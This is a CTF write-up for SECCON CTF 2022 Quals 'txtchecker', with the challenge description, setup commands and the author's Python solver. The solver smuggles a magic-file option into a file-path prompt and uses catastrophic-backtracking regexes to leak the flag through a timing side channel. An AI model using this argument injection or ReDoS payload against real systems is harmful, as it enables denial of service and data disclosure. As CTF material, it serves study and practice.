---
title: "Txtchecker - SECCON CTF 2022 Quals"
category: "misc"
subcategory: "dos"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "redos", "txtchecker", "misc", "seccon-ctf-2022-quals"]
summary: "I'm creating a text file checker."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/misc/txtchecker"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Quals"
  year: 2022
  challenge: "Txtchecker"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/misc/txtchecker>
- **CTF:** SECCON CTF 2022 Quals

---

# [misc] txtchecker

## Description

I'm creating a text file checker. It still in the process of implementation...

```
sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022
```

## Attachments

- [txtchecker](files/txtchecker)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=2022 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `solver.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202211_SECCON_CTF_2022_Quals/misc/txtchecker/solver/solver.py>

```python
import string
import os
import pwn
import time

REDOS_POWER = 20
TIMEOUT = 20

SSH_CMD = f"sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@{os.getenv('SECCON_HOST')} -p {os.getenv('SECCON_PORT')}"


def get_time(rule: str) -> bool:
    io = pwn.process(SSH_CMD, shell=True, stdin=pwn.PTY, raw=False)
    io.sendlineafter(b"Input a file path: ", b"-m /dev/tty /flag.txt")
    io.sendline(rule.encode())
    for i in range(REDOS_POWER):
        io.sendline(f">0 regex \\^(((((((((((((((((((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*@ ReDoS-{i}".encode())
    io.recvuntil(f"ReDoS-{REDOS_POWER - 1}".encode(), timeout=TIMEOUT)
    io.send("\x04")  # Ctrl+D

    t1 = time.time()
    io.recvall(timeout=TIMEOUT)
    t2 = time.time()
    io.close()
    return t2 - t1


def get_rule(index: int, next_chars: str) -> str:
    def escape(s): return s.replace("{", "\\\\{").replace("}", "\\\\}")
    expr = "".join([
        "\\^",
        "[",
        escape(next_chars),
        "]"
    ])
    return f"{index} regex {expr}"


CHARS = "_}" + string.ascii_letters + string.digits

flag = "SECCON{"
while not flag.endswith("}"):
    left = 0
    right = len(CHARS)
    while right - left > 1:
        mid = (left + right)//2
        t_left = get_time(get_rule(len(flag), CHARS[:mid]))
        t_right = get_time(get_rule(len(flag), CHARS[mid:]))
        print(f"{t_left = }, {t_right = }")
        if t_left > t_right:
            right = mid
        else:
            left = mid
    flag += CHARS[left]
    print(flag)
print(f"{flag = }")
```
